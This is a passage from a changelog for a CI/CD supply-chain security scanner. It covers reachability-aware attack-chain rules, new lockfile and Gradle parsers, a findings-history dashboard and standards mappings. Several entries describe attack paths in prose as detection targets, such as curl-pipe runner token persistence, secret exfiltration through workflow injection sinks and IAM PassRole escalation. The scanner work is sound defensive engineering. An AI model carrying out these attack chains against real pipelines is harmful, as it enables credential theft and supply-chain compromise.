  `GHA-002` ∩ `GHA-012` (the same job both runs PR-head code AND
  hosts on a non-ephemeral self-hosted runner). `GHA-012` gained
  `job_anchors` carrying the non-ephemeral job IDs to support
  this and the future `AC-010` / `AC-013` migrations.

- **Reachability-aware AC-010 / AC-013 / AC-014 (runner +
  token-persistence family).** `AC-010` (self-hosted runner +
  curl-pipe / token persistence), `AC-013` (caller-controlled
  GHA runner + token persistence), and `AC-014` (the GitLab
  analog: caller-controlled tags + CI-token persistence) all
  use the `job_anchors` intersection model. AC-010 confirms when
  `GHA-012` ∩ `GHA-019` share a job (the curl-pipe-only branch
  via `GHA-016` is a blob scan with no per-job attribution, so
  it stays as the legacy co-occurrence signal). AC-013 confirms
  when `GHA-036` ∩ `GHA-019` share a job; AC-014 confirms when
  `GL-032` ∩ `GL-020` share a job. `GHA-019`, `GHA-036`, `GL-032`,
  `GL-020` all gained `Finding.job_anchors`.

- **Self-hosted findings-history dashboard (`pipeline_check
  history`).** New CLI subcommand that reads a directory of
  timestamped scan-output JSON files (default
  ``.pipeline-check-history/``) and renders a single self-
  contained HTML page with trend graphs (per-severity failed
  findings over time, score over time) and a top-N firing-rules
  burn-down table. Inline CSS + inline SVG charts; no
  JavaScript, no CDN, no web server. The output is one ``.html``
  file the user can open locally, email, or commit to a posture-
  history branch — closes the "do we even have visibility?"
  roadmap gap without dragging in a SaaS dashboard or a database.
  Timestamps are extracted from the filename
  (``scan-YYYYMMDD-HHMMSS.json`` or ``YYYY-MM-DD.json``) with a
  fallback to file mtime, so the existing CI convention
  (``--output json --output-file scan-$(date +%Y%m%d-%H%M%S).json``)
  works as-is. Malformed JSON files surface as warnings and are
  skipped without breaking the render. Eighteen new tests in
  ``tests/test_history.py`` exercise the timestamp parser,
  loader (chronological sort, mtime fallback, malformed-skip,
  non-dict top-level skip, rule-counts extraction, missing-
  directory error path) and renderer (empty-state placeholder,
  chart polylines, warnings surfaced, top-N clamp), plus a CLI
  integration test via ``CliRunner``. A FastAPI live-reload
  variant is a phase-2 follow-up; the static HTML is the more-
  useful primitive (serve it from anywhere) and the FastAPI
  wrapper just adds auto-refresh on top.

- **Gradle (build.gradle / build.gradle.kts) parser via
  PomFile synthesis.** Closes the third deferred dependency-
  registry format in this cycle. ``build.gradle`` and
  ``build.gradle.kts`` join ``pom.xml`` / ``settings.xml`` in the
  maven provider's recognized inputs; the loader detects the
  filename and routes through a new ``_parse_gradle`` regex-based
  extractor that emits the same :class:`PomFile` shape from
  ``"group:artifact:version"`` coordinate strings, ``group:`` /
  ``name:`` / ``version:`` map-form deps (Groovy ``,`` separator
  and Kotlin DSL ``=`` separator both handled), and ``maven { url
  ... }`` / ``maven { url = uri(...) }`` / ``maven("...")``
  repository blocks. Built-in shorthand
  (``mavenCentral()`` / ``google()``) is omitted because the rule
  pack doesn't flag those and their URLs are well-known. Trailing
  ``:classifier`` / ``@type`` (sources / javadoc / war) is
  consumed but discarded so the version literal stays clean. The
  ``build/`` and ``.gradle/`` output directories are excluded
  from the loader's rglob so cached / generated copies don't
  double-count. MVN-001 / MVN-002 / MVN-003 / MVN-006 fire on
  Gradle projects without per-rule changes. Variable substitution
  (``${junitVersion}``) stays unresolved for this pass — the
  rule layer then sees the literal ``${...}`` and treats it as
  a dynamic version (MVN-001 fires accordingly); a follow-up can
  walk ``ext { }`` / Kotlin ``val`` declarations to resolve.
  Version catalogs (``libs.versions.toml``) and BOM imports are
  also follow-ups. Sixteen new tests in ``tests/maven/test_gradle.py``
  exercise the parser (Groovy / Kotlin / map-form / classifier
  stripping / dedup / repos / variable carry-through), the
  ``build/`` exclusion, and end-to-end firing through
  ``MavenChecks``.

- **Pipfile.lock parser via requirements-file synthesis.**
  ``Pipfile.lock`` joins ``poetry.lock`` / ``requirements*.txt`` /
  ``*.in`` in the pypi provider's recognized inputs; the loader
  detects the filename and routes through a new
  ``_parse_pipfile_lock`` helper that parses JSON via stdlib
  ``json`` and walks both top-level buckets (``default``,
  ``develop``). Registry entries become ``<name>==<version>``
  bodies after stripping the leading ``==`` operator Pipfile.lock
  bakes into the ``version`` field; git entries become PEP 508
  direct URLs (``<name> @ git+<url>@<ref>``); per-entry
  ``hashes`` flow through as ``--hash=sha256:...`` flags. The
  file-level ``--require-hashes`` matches Pipenv's install-time
  enforcement contract so PYPI-002 doesn't false-positive on a
  Pipenv-locked project. PYPI-001 / PYPI-002 / PYPI-004 / PYPI-
  006 fire without per-rule changes. Thirteen new tests in
  ``tests/pypi/test_pipfile_lock.py`` exercise the parser
  (default + develop walking, version normalization, git with /
  without ref, malformed entries) and end-to-end firing through
  ``PypiChecks`` on a real Pipfile.lock.

- **poetry.lock parser via requirements-file synthesis.**
  ``poetry.lock`` joins ``requirements*.txt`` / ``*.in`` in the
  pypi provider's recognized inputs; the loader detects the
  filename and routes through a new ``_parse_poetry_lock`` helper
  that parses TOML via stdlib ``tomllib`` and projects each
  ``[[package]]`` entry onto a :class:`RequirementLine`. Registry-
  resolved packages get a ``<name>==<version>`` body; git-sourced
  packages (``[package.source]`` ``type = "git"``) get a PEP 508
  direct URL body (``<name> @ git+<url>@<sha>``) preferring
  ``resolved_reference`` over the branch / tag in ``reference``
  so a Poetry lockfile that pinned to ``main`` upstream still
  passes PYPI-004 once the install materialized the SHA. Each
  package's file hashes (lock-version 2.x inline ``files`` field,
  lock-version 1.x ``[metadata.files]`` map) become per-line
  ``--hash=sha256:...`` flags, and ``--require-hashes`` is set at
  the file level since Poetry enforces hashes at install time —
  PYPI-001 / PYPI-002 / PYPI-004 / PYPI-006 then apply to
  Poetry-locked projects without per-rule changes. ``pyproject.toml``
  (PEP 621 / Poetry deps) and ``Pipfile.lock`` stay deferred —
  each warrants its own parser. Twelve new tests in
  ``tests/pypi/test_poetry_lock.py`` exercise the parser (lock-
  version 1 + 2 file shapes, git sources with / without
  resolved_reference, packages missing files, empty lockfile)
  and end-to-end firing through ``PypiChecks`` on a real
  poetry.lock.

- **yarn.lock (yarn 1 / Classic) parser via npm-lock-shape
  synthesis.** ``yarn.lock`` joins ``package-lock.json`` /
  ``npm-shrinkwrap.json`` / ``pnpm-lock.yaml`` in
  ``NpmContext.LOCKFILE_NAMES``; the loader detects the filename
  and routes through new ``_parse_yarn_lock`` +
  ``_synthesize_yarn_lock`` helpers. The yarn 1 parser handles
  multi-pattern headers (``"@babel/code-frame@^7.0.0",
  "@babel/code-frame@^7.16.0":``), scoped names, comments,
  blank lines, and the nested ``dependencies:`` sub-block (which
  is skipped — the existing NPM-* rules don't need transitive
  metadata). The synthesizer projects each entry to an npm-7+
  record (``name`` / ``version`` / ``resolved`` / ``integrity``)
  keyed by ``node_modules/<name>`` with the same ``+<version>``
  disambiguation pnpm uses for multi-version installs. NPM-002 /
  NPM-003 / NPM-006 now fire on yarn-locked projects without
  per-rule changes. Yarn 2+ / Berry (which ships ``__metadata:``
  plus ``checksum`` instead of ``integrity``) stays out of scope
  for this pass — same template, different field names, deferred
  to a follow-up. Nineteen new tests in
  ``tests/npm/test_yarn_lock.py`` exercise the pattern splitter,
  parser (multi-pattern / sub-block / comments), synthesizer
  (scoped / multi-version / missing-resolved), and end-to-end
  firing through ``NpmChecks`` on a real yarn.lock.

- **pnpm-lock.yaml parser closes the npm-side lockfile gap.**
  ``pnpm-lock.yaml`` joins ``package-lock.json`` /
  ``npm-shrinkwrap.json`` in ``NpmContext.LOCKFILE_NAMES``; the
  loader detects the YAML extension, parses via the project's
  ``safe_load_yaml``, and routes the result through a new
  ``_synthesize_pnpm_lock`` helper that projects pnpm's
  ``packages:`` block onto the npm-7+ lockfile shape every existing
  rule already reads. The synthesizer handles every pnpm key form
  shipped to date (v5 ``/<name>/<ver>``, v6 ``/<name>@<ver>``, v9
  ``<name>@<ver>``, scoped names, peer-dep ``(react@18)`` suffix),
  populates ``integrity`` from ``resolution.integrity`` for
  registry tarballs, synthesizes the canonical
  ``https://registry.npmjs.org/<name>/-/<unscoped>-<ver>.tgz`` URL
  so NPM-003 sees the same source shape it sees in a real npm
  lockfile, threads ``resolution.tarball`` URLs through for
  non-registry sources (so NPM-003's HTTP / git+ssh classifier
  fires correctly), and translates ``resolution: {type: git, repo,
  commit}`` into ``git+<repo>#<sha>`` for NPM-003. NPM-002 / NPM-
  003 / NPM-006 now apply to pnpm-locked projects without per-rule
  changes; ``yarn.lock`` stays out of scope (its bespoke
  YAML-flavored format warrants its own parser, deferred).
  Twenty new tests in ``tests/npm/test_pnpm_lock.py`` exercise the
  synthesizer's key parsing, resolved/integrity normalization, and
  end-to-end firing through ``NpmChecks`` on a real pnpm-lock.yaml.

- **ResourceAnchor phase 1: XPC-002 (oci_image, base image →
  runtime workload).** Closes one of the two phase-0 ResourceAnchor
  follow-ups called out in the CHANGELOG ("XPC-002, XPC-003"). Both
  legs now emit ``oci_image`` anchors via the phase-0
  ``_primitives/anchors.oci_image()`` canonicalizer: ``DF-001``
  walks each unpinned ``FROM`` ref and ``K8S-001`` walks every
  unpinned workload container ``image:`` field. ``XPC-002.match()``
  intersects the two legs on the shared image identity through
  ``group_by_anchor`` — each matched image emits ONE confirmed
  chain (``confirmed_reachable=True``, ``Confidence.HIGH``, image
  identity as the chain resource, narrative cites the shared
  image). Findings that didn't contribute to a confirmed pair feed
  the legacy per-pair cross-product fallback so the original triage
  prompt ("here are the (dockerfile, manifest) pairs to
  investigate") still surfaces when build and runtime reference
  different images. Four new TestXPC002 cases (confirmed pair,
  disjoint fallback, fan-out one chain per image, partial-match
  mix). Existing per-pair tests preserved via the fallback path.

- **AC-005 oci_image extraction extended to every cross-provider
  leg pair.** Cross-provider extension of the GHA-only AC-005
  pilot (see entry below). Eleven more leg rules now emit
  ``oci_image`` anchors via ``_primitives/oci_refs.py``:
  - **Build-side**: GL-006, BB-006, ADO-006, CC-006, JF-006,
    GCB-009 (Cloud Build also walks its structured top-level
    ``images:`` list directly before the publisher-only text
    scan).
  - **Deploy-side**: GL-004, BB-004, ADO-004, CC-009, JF-005.

  Jenkins legs use ``jf.text_no_comments`` to skip commented
  shell mentions; YAML providers hand the ungated job / step
  sub-tree to the extractor rather than the whole document so a
  gated job's image doesn't lend its identity to an AC-005
  confirmation about an ungated leg. All eleven gate on a failing
  finding.

  SIGN-001 / CP-001 / CP-005 are deliberately not wired: they
  operate on the live AWS API surface where the API responses
  don't name artifact image references. Those legs stay on the
  scan-level co-occurrence fallback AC-005 already preserves.

  Eleven new parametrized ``TestChainAC005`` cases (one per
  cross-provider leg pair) assert one confirmed chain at HIGH
  confidence per matched ``oci_image`` identity.

- **ResourceAnchor phase 1: AC-005 (oci_image, build → deploy) —
  GHA pilot.** Original pilot for the cross-provider unsigned-
  artifact-to-prod chain. New ``_primitives/oci_refs.py`` helper
  extracts image references from GHA workflows via two
  complementary passes: (1) structured — walks every
  ``docker/build-push-action`` / ``docker/metadata-action`` step's
  ``with.tags`` input; (2) text scan — pulls image-shaped tokens
  out of deploy-shaped shell commands in ``run:`` blocks
  (``docker push`` / ``docker tag`` / ``kubectl set image`` /
  ``helm upgrade --set image=`` / ``gcloud run deploy`` /
  ``az containerapp`` / ``aws ecs update-service``). Every
  candidate runs through the phase 0 ``oci_image()`` canonicalizer.

  **GHA-006** (artifact signing) and **GHA-014** (deploy
  environment) emit ``oci_image`` anchors for every image they
  reference, only on failure.

  **AC-005** iterates the cross-product of build / deploy leg
  IDs through ``group_by_anchor`` on ``oci_image``. Each matched
  image identity emits one confirmed chain
  (``confirmed_reachable=True``, ``Confidence.HIGH``, narrative
  cites the shared image, resource is the image identity). Falls
  back to scan-level co-occurrence when no image matches.

  Cross-provider extension to ``GL-*`` / ``BB-*`` / ``ADO-*`` /
  ``CC-*`` / ``GCB-*`` / ``JF-*`` legs lands in the follow-up
  entry above.

- **ResourceAnchor phase 1: AC-011 / AC-020 / AC-021 (k8s_sa
  intersection across Kubernetes / Tekton / Argo).** Closes the
  K8s-side phase 1 set. Five leg rules now emit ``k8s_sa`` anchors
  (canonical identity ``<namespace>/<name>``):
  - **K8S-013** anchors each hostPath-mounting workload on its
    effective ``serviceAccountName`` (falls back to the namespace's
    ``default``, matching kubelet semantics).
  - **K8S-020** anchors each cluster-admin ClusterRoleBinding on its
    ServiceAccount subject(s); Group / User subjects don't map to
    ``k8s_sa`` and skip silently.
  - **K8S-029** anchors each default-SA RoleBinding on the
    ``(namespace, default)`` pair it grants to (de-duped across
    multiple offenders in the same namespace).
  - **ARGO-003** anchors each offending Workflow on its
    ``(namespace, default)`` pair — the SA the workflow runs as when
    ``serviceAccountName`` is missing or explicitly ``default``.
  - **TKN-004** anchors only when the Task pins
    ``spec.podTemplate.serviceAccountName`` explicitly. The runtime
    SA is normally TaskRun-determined and not visible in the manifest;
    guessing ``default`` would over-confirm AC-020, so unanchored
    Tasks fall through to the co-occurrence fallback.

  Chain migrations:
  - **AC-011** (K8S-013 ∩ K8S-020): confirmed when the
    hostPath-mounting pod runs as a cluster-admin-bound SA — node
    escape and API takeover in one execution context, no separate
    token-theft step.
  - **AC-020** (TKN-004 ∩ K8S-020): confirmed when the Task pins
    its SA to a cluster-admin binding subject. Common case (Task
    doesn't pin an SA) falls through to co-occurrence.
  - **AC-021** (ARGO-003 ∩ K8S-029): confirmed when the Workflow's
    namespace+default SA matches one of K8S-029's default-SA
    binding subjects — single-namespace single-step privesc.

  Six new TestChainAC{011,020,021} cases (confirmed-pair +
  fallback-disjoint per chain). All previous tests preserved via
  the co-occurrence fallback path. Full suite: 6279 passed,
  11 skipped.

- **ResourceAnchor phase 1: AC-007 (IAM PrivEsc via CodeBuild).**
  `AC-007` now uses ``group_by_anchor`` on ``iam_role`` against
  both IAM-side legs. CB-002 emits ``iam_role`` from the project's
  ``serviceRole`` ARN (boto3 ``BatchGetProjects`` payload). When
  the privileged CodeBuild project's service role IS the IAM-002
  wildcard role and/or the IAM-004 PassRole-* role, the chain
  emits ONE confirmed chain carrying both IAM legs (a single
  role triggering both isn't two separate chains). Confirmed →
  ``confirmed_reachable=True``, ``Confidence.HIGH``, narrative
  cites the shared role ARN, resource is that ARN. Falls back to
  scan-level co-occurrence when the project's service role and
  the IAM-flagged role differ (the cross-principal pivot still
  applies but isn't visible from a single execution context).
  Closes the IAM-leg side of the cross-provider phase 1 set
  (AC-007 / AC-016 / AC-019 all on ``iam_role``;
  AC-017 / AC-024 on ``ecr_repo``).

- **ResourceAnchor phase 1: AC-017 (cache poisoning + mutable ECR
  tag).** `AC-017` now uses ``group_by_anchor`` on ``ecr_repo``.
  ECR-002 emits the canonical registry URI from boto3's
  ``describe_repositories.repositoryUri``; GHA-011 scans every
  string in its workflow doc for the ``<acct>.dkr.ecr.<region>
  .amazonaws.com/<repo>`` shape (covers ``docker push``,
  ``docker/build-push-action`` ``tags:`` inputs, and ``aws ecr``
  invocations alike) and emits one ``ecr_repo`` anchor per match.
  Each matched repo URI composes ONE confirmed chain with
  ``confirmed_reachable=True``, ``Confidence.HIGH``, narrative
  citing the URI, and that URI as the chain's resource. Falls
  back to scan-level co-occurrence when no anchor matches
  (templated tags, indirect push through an intermediate
  registry, or the workflow doesn't touch ECR) so the legacy
  "cache poisoning + mutable tag somewhere" signal survives.
  AC-024 (OIDC drift + mutable ECR) stays on aggregate
  co-occurrence by design — its threat model is explicitly the
  cross-product, not a per-pair claim; the carve-out docstring
  now notes that AC-017 is the per-pair variant for callers who
  want the tighter signal.

- **ResourceAnchor phase 1: AC-019 (Lambda env-secret + PassRole
  *).** `AC-019` now uses ``group_by_anchor`` on ``iam_role``.
  LMB-003 emits two anchors per finding — ``lambda_fn`` for the
  function ARN and ``iam_role`` for the function's *execution*
  role ARN (boto3's ``Role`` field); IAM-004 emits ``iam_role``
  for its own role's ARN. A shared identity confirms the tight
  pairing: the secret-leaking Lambda is itself running as the
  wildcard-PassRole role, so anyone who exfils the env var
  inherits the role-hop primitive in one execution context with
  no separate principal-reach step. Confirmed → confidence
  promoted to HIGH, narrative cites the shared role, resource is
  the role ARN. Falls back to scan-level co-occurrence when the
  Lambda's execution role and the PassRole-* role differ — the
  original "account-wide leak + account-wide PassRole wildcard"
  signal is still worth surfacing because the cross-principal
  attack remains viable.

- **ResourceAnchor phase 1: AC-016 pilot (OIDC role drift).**
  First cross-provider chain to consume the phase 0 `ResourceAnchor`
  foundation. **IAM-002** now emits an ``iam_role`` anchor from the
  role's full ARN (already in the boto3 ``list_roles`` payload), and
  **GHA-030** parses ``with.role-to-assume`` out of every offending
  job's ``aws-actions/configure-aws-credentials`` step. Full ARNs
  become ``iam_role`` anchors that intersect cleanly with IAM-002's;
  bare role names emit the looser ``iam_role_name`` kind (which
  doesn't fuzzy-match into ``iam_role``, by canonicalizer carve-out);
  templated refs (``${{ secrets.ROLE_ARN }}``) produce no anchor.
  AC-016 now does the intersection first via ``group_by_anchor``:
  each matched role ARN emits ONE confirmed chain with
  ``confirmed_reachable=True``, ``Confidence.HIGH``, narrative
  citing the role ARN, and that ARN as the chain's resource. When
  no anchor matches (template refs, bare names, unrelated roles),
  the chain falls back to a single scan-level co-occurrence chain
  at ``min_confidence(legs)`` so the legacy "any drift × any
  wildcard" signal survives. Three new ``TestChainAC016`` cases
  cover the confirmed pairing, the disjoint-anchor fallback, and
  fan-out to one confirmed chain per matched ARN. The pilot
  validates the foundation end-to-end: same ARN canonicalization
  on both sides of the provider boundary, ``group_by_anchor``
  ranks ahead of the legacy co-occurrence helper, and existing
  synthetic tests (no anchors on the input) still produce the
  prior single-chain output via the fallback path.

- **Reachability-aware AC-029 (untrusted-trigger publish lane).**
  `AC-029` (Ultralytics / s1ngularity class) now uses the
  3-leg-set ``job_anchors`` intersection model. Each leg is an
  any-of: trigger ∈ {GHA-002, GHA-009, GHA-013}; credential ∈
  {GHA-005, GHA-050}; integrity ∈ {GHA-021, GHA-029}. The chain
  unions anchors *within* each leg (any of the variants
  fires), then intersects *across* the three legs. Confirmed
  reachable when one job carries all three at once — the precise
  Ultralytics / s1ngularity execution context (an attacker-landed
  input lands in the same job that holds the publish credential
  AND runs the unguarded install). Backfilled three leg rules in
  the same pass: GHA-009 anchors on the jobs that download an
  upstream artifact unverified; GHA-013 anchors workflow-wide
  (issue_comment fires every job, so fan out to all of them);
  GHA-050 anchors on the publish jobs that hold the long-lived
  registry token. GHA-009 carries a known-limitation note about
  the workflow-level ``verified`` flag: a workflow where one job
  downloads-without-verifying and a different job runs a
  cosign / attestation check still reads as passed, so anchors
  stay empty and AC-029 can't confirm reachability on that
  shape — tightening to per-job verification belongs in a
  GHA-009 reshape, not this chain pass. New TestChainAC029
  class covers the new behavior plus the prior chain-level
  contracts (no test existed before).

- **Remaining AC chains carve out the reachability model.** The
  ``job_anchors`` intersection pattern doesn't apply to every
  chain shape; rather than silently leave half the catalog
  inconsistent, each remaining chain now carries a one-paragraph
  docstring note explaining the carve-out. File-resource OK
  (file/manifest co-location IS the reachability claim, no
  per-job structure to anchor on): AC-015 (Helm chart), AC-027
  (Dockerfile credential + EXPOSE). AC-028 (npm worm) carves
  out for a different reason — covered in its own entry below.
  AC-024 stays scan-aggregate by design — covered in its own
  entry below. Every other AC chain (AC-005, AC-007, AC-011,
  AC-016, AC-017, AC-019, AC-020, AC-021, plus the ``job_anchors``
  pilots) migrates to an intersection model over the course of
  this release. Wraps the migration arc with each chain's model
  decision documented in-source.

- **Reachability-aware AC-009 (3-leg supply-chain repo poisoning).**
  `AC-009` (GHA-001 unpinned action + GHA-002 injection sink +
  GHA-008 literal credential) now uses a 3-way `job_anchors`
  intersection. GHA-008 was the last leg without anchors; it now
  scans each job sub-tree with `find_secret_values` to attribute
  per-job hits, and when the secret only matches at the workflow
  level (top-level ``env:`` / ``defaults.run.env``, inherited by
  every job) fans the anchor out to every job so reachability
  with GHA-001 / GHA-002 lands on the inheriting jobs. Confirmed
  → `confirmed_reachable=True`, confidence `HIGH`, reachability
  note citing the shared job(s) — that's the single execution
  context where a fork PR can exfiltrate the plaintext secret
  through the injection sink in one run, with the unpinned
  action giving a second route on the next upstream release.
  Disjoint anchors keep the legacy co-occurrence signal (the
  credential literal still needs rotating regardless).

- **AC-028 (npm worm propagation) deliberately stays on
  co-occurrence.** Unlike the other GHA-leg chains, AC-028's
  legs straddle two distinct file shapes (a `package.json`
  manifest + a GitHub Actions workflow) that are by design
  wired through `npm publish` + scheduled / fork-PR workflow
  execution rather than through one shared execution context.
  Repo-level co-occurrence IS the reachability claim for the
  Shai-Hulud-class worm topology; there's no tighter same-job
  signal to add. Documented in the chain rule's docstring.

- **Reachability-aware AC-025 (Argo param injection + privileged
  template).** `AC-025` now intersects `ARGO-002` ∩ `ARGO-005`
  template anchors, mirroring the AC-023 Tekton port. Argo's
  check surface also collapses every Workflow / WorkflowTemplate
  / ClusterWorkflowTemplate finding into a single
  ``resource="argo"`` row, so before this migration AC-025 fired
  on whole-corpus co-occurrence. Both leg rules now populate
  `Finding.job_anchors` with a template-scoped identifier in
  the form ``<Kind>/<name>:<template>``. When ARGO-002's
  privilege comes from ``spec.podSpecPatch: 'privileged: true'``
  (workflow-wide rather than per-template), the rule fans out
  one anchor per template in that workflow so reachability with
  ARGO-005 on any one of them still lands on the same key.
  Confirmed → `confirmed_reachable=True`, confidence promoted to
  `HIGH`, and a `reachability_note` citing the shared template(s).
  Disjoint anchors fall back to the legacy co-occurrence signal.

- **Reachability-aware AC-023 (Tekton param injection + privileged
  step).** `AC-023` now intersects `TKN-002` ∩ `TKN-003` job
  anchors. Tekton's check surface collapses every Task / ClusterTask
  finding into a single ``resource="tekton"`` row, so prior to
  this migration the chain fired whenever ANY Task in the corpus
  had a privileged step AND ANY (possibly different) Task had an
  unsafe param interpolation, even when the two were structurally
  disjoint. Both leg rules now populate `Finding.job_anchors` with
  a step-scoped identifier in the form ``<Kind>/<name>:<step>``
  (e.g. ``Task/release:build-image``), and the chain confirms
  reachable only when the same step both runs privileged AND
  interpolates ``$(params.<name>)`` unquoted, the precise
  kernel-RCE primitive (one shell command lands in one
  privileged container in one PipelineRun). Confirmed →
  `confirmed_reachable=True`, confidence promoted to `HIGH`, and a
  `reachability_note` citing the shared step(s). Disjoint anchors
  (privileged step in one Task, injection sink in another) fall
  back to the legacy co-occurrence signal because each leg is
  independently risky and worth surfacing, just not as the
  single-step kernel-RCE composition.

- **Reachability-aware AC-012 (reusable workflow secret exfil).**
  `AC-012` (mutable reusable-workflow ref + ``secrets: inherit``)
  now intersects `GHA-025` ∩ `GHA-034` job anchors. Both leg rules
  already walked per-job; the migration was to surface the
  offending job IDs as `Finding.job_anchors`. When the same call
  site (`jobs.<id>.uses:` + `jobs.<id>.secrets: inherit`) carries
  both the mutable ref AND the inherit pass-through, the chain
  emits with `confirmed_reachable=True`, confidence promoted to
  `HIGH`, and a `reachability_note` citing the shared job(s).
  The single-step tag-move-to-credential-exfil channel: one tag
  move on the callee repo and the entire caller secret surface
  ships to attacker code in the next run. Disjoint anchors (two
  reusable-workflow calls on the same file but in different jobs)
  fall back to the legacy co-occurrence signal — each leg is
  independently risky but neither single call site exposes both.

- **Reachability-aware AC-008 (dependency confusion window).**
  `AC-008` (lockfile miss + integrity-bypass install) now uses the
  same `job_anchors` intersection model as the rest of the GHA
  chain pack. `GHA-021` and `GHA-029` were both blob scans against
  the whole workflow with no per-job attribution; they now walk
  each job's ``steps[].run`` and anchor on the job IDs where the
  offending install command was found. When the lockfile-skipping
  install AND the integrity-bypass install land in the same job,
  the chain emits with `confirmed_reachable=True`, confidence
  promoted to `HIGH`, and a `reachability_note` citing the shared
  job(s) — the tightest dependency-confusion / typosquatting
  window where one execution context exposes both detection legs.
  Disjoint anchors fall back to the legacy co-occurrence signal
  (each install path is individually exploitable). Side effect of
  the leg-rule migration: GHA-021 / GHA-029 now ignore non-`run:`
  surfaces (step names, env values, action `with:` blocks) that
  the prior blob scan was nominally scanning but where a shell
  install command would be a false positive.

### Changed

- **Image-reference parsing consolidated into one primitive.** New
  ``pipeline_check/core/checks/_primitives/image_ref.py`` carries the
  structural decomposition (registry / repository / tag / digest) for
  OCI / Docker image references. ``container_image.classify`` (AWS-
  managed / digest / trusted-registry verdict) and
  ``image_pinning.classify`` (pin-tightness ``PinKind``) now delegate
  to it instead of each carrying their own ``@sha256:`` regex and
  ``rpartition('/')`` dance. Domain verdicts stay with their
  classifier; only the grammar moved. ``DIGEST_RE`` and
  ``VERSION_TAG_RE`` remain as module-level exports on
  ``image_pinning`` because four provider ``_helpers.py`` modules
  re-export them by identity. Edge-case behavior shift in
  ``image_pinning.classify``: a trailing colon with no tag
  (``foo:``) and a bare colon (``:``) now return ``PinKind.NO_TAG``
  rather than ``PinKind.FLOATING`` (an explicit colon with no tag
  really is an absent tag, not a mutable one); ``classify(None)``
  returns ``PinKind.NO_TAG`` instead of raising ``TypeError``. The
  common cases (``:latest``, ``:3.12.1``, ``@sha256:<64 hex>``,
  bare ``alpine``) are unchanged.

- **LSP diagnostics carry the upstream severity name in ``data``.**
  ``finding_to_diagnostic`` now sets
  ``Diagnostic.data = {"severity": finding.severity.name}`` (one of
  ``CRITICAL`` / ``HIGH`` / ``MEDIUM`` / ``LOW`` / ``INFO``). The LSP
  ``DiagnosticSeverity`` enum collapses CRITICAL + HIGH into a single
  ``Error`` value, so a precise client-side filter (e.g. "critical
  only" in an editor) needs the full upstream name on the wire. The
  VS Code extension's v0.1.1
  [pipelineCheck.severityThreshold](https://github.com/greylag-ci/pipeline-check-vscode)
  knob reads this field; older clients that ignore ``data`` are
  unaffected.

- **LSP diagnostics now self-contain the fix and link to the rule
  doc.** ``finding_to_diagnostic`` and ``findings_to_diagnostics``
  accept the dispatched provider name and set
  ``Diagnostic.codeDescription.href`` to
  ``https://dmartinochoa.github.io/pipeline-check/providers/<provider>/#<id>``,
  so the rule ID rendered next to each finding (e.g. ``GHA-001`` in
  the Problems panel) becomes a clickable "Open documentation" link
  in the editor. The diagnostic message also gains a ``Fix:``-prefixed
  line carrying ``Finding.recommendation`` (the title and dynamic
  description still lead), so a hover surfaces problem → why → fix
  without sending the user to the docs site first. Both args are
  optional and back-compatible: callers that don't supply a provider
  get the old plain ``code``-only diagnostic.

- **Broadened CIS Software Supply Chain Security Guide to near-full
  catalog coverage.** Cross-mapping pass: no new rule modules, 217
  net-new entries that fill the queued backfills called out in
  `tests/test_standards.py`. New entries land in their natural
  Section-3 (Build Dependencies) home for the **NPM-001..007 / 011**,
  **PYPI-001..006**, and **MVN-001..007** dep-supply-chain packs;
  Section-2 (Build Pipelines) for the **TAINT-001..008** cross-step
  flow family and the matching Jenkins (**JF-001..034**, minus the
  two already mapped), Drone (**DR-001..011**, minus DR-004), and
  per-CI defensive packs (GHA-009..058, GL-009..033, BB-009..029,
  ADO-009..030, CC-025..029, BK-014/015, TKN-013..015,
  ARGO-013..015); Section-4 (Artifacts) for the OCI gap-fill
  (OCI-004/007/008). Dockerfile expansion (DF-009, DF-021..030)
  picks up the environment-based runtime-bypass pack against 3.1.5
  (trusted package managers). AWS leg extends CodeBuild
  (CB-008..011), CodePipeline (CP-005/007), PBAC-005, CodeArtifact
  (CA-001), CodeCommit (CCM-001/002/003), Lambda (LMB-002/003),
  KMS-002, SM-002, SSM-001/002, and EB-002. Terraform / CloudFormation
  IaC-native gap-fill maps **TF-001..003** and **CF-001..003**
  (long-lived access keys as code → 1.3.4, hard-coded secret
  shapes → 1.5.1 + 2.3.4, CodeBuild VPC public subnet → 2.1.6).
  SCM-026 (webhook insecure transport / no HMAC) is reversed from
  its previous unmapped state and lands at 2.4.3 (unauthenticated
  pipeline-exec trigger surface). The 15 `-000` degraded-mode
  discovery findings (CB-000, CP-000, CD-000, ECR-000, IAM-000,
  PBAC-000, CT-000, CWL-000, EB-000, CA-000, CCM-000, LMB-000,
  KMS-000, SM-000, SSM-000) land at 2.3.7 (pipeline audit logs) /
  5.2.3 (deploy env audit), mirroring the OWASP CICD-SEC-10 +
  ESF-C-AUDIT precedent — when the scanner cannot enumerate a
  provider surface the visibility gap surfaces as an unobservable
  pipeline / deployment audit trail, the same conceptual scope as
  the CIS audit sub-controls. After: 512 mappings (was 278), all
  25 controls evidenced, 99% of the OWASP catalog mapped. The 4
  rules left unmapped are scoped outside the supply-chain surface
  (DF-007 / OCI-006 container-runtime hygiene, KMS-001 / SM-001
  key + secret rotation lifecycle).

- **Broadened S2C2F (Secure Supply Chain Consumption Framework)
  mappings on the OSS-consumption surface.** Cross-mapping pass,
  no new rule modules, 59 net-new entries. S2C2F is narrower than
  CIS SSCS — it only covers Ingest / Scan / Inventory / Update /
  Enforce / Audit / Rebuild / Fix for consuming open-source
  software, so the expansion targets just the surfaces that fit:
  **ING-1** (trusted package managers) picks up cross-provider TLS
  bypass (GL-023, BB-023, ADO-023, JF-023/35, DR-006, GCB-011),
  GHA remote-script / insecure-install (GHA-016, GHA-017), and the
  NPM/PyPI/Maven non-registry / extra-index / wildcard-mirror
  shape (NPM-003/004/007, PYPI-003/005, MVN-003/007). Dockerfile
  env-bypass pack (DF-021/22/24/26..29) lands on ING-1 too, since
  the env vars disable the trusted-source channel for any in-image
  install. **ING-3** (deny-list) picks up the GHA reputation pack
  (GHA-041/042/043/047) as deny-list-candidate signals. **UPD-1**
  (pin + track) extends across Drone (DR-001/005/008), NPM/PyPI/
  Maven pinning (NPM-001/002/005, PYPI-001/002/004,
  MVN-001/002/004/005), OCI legacy / weak-digest shapes (OCI-007/
  008), and the GHA-023 reusable-workflow / GHA-051 services-image
  / BB-029 step+service pinning surface. **REB-3** (SBOM) extends
  to OCI provenance annotations (OCI-001/003/005), Helm chart
  metadata (HELM-005/007/010), and SBOM-content gaps in the
  ATTEST family (ATTEST-003/004/007). **REB-4** (signed-SBOM /
  attested provenance) extends to ATTEST-001/002/005/006 +
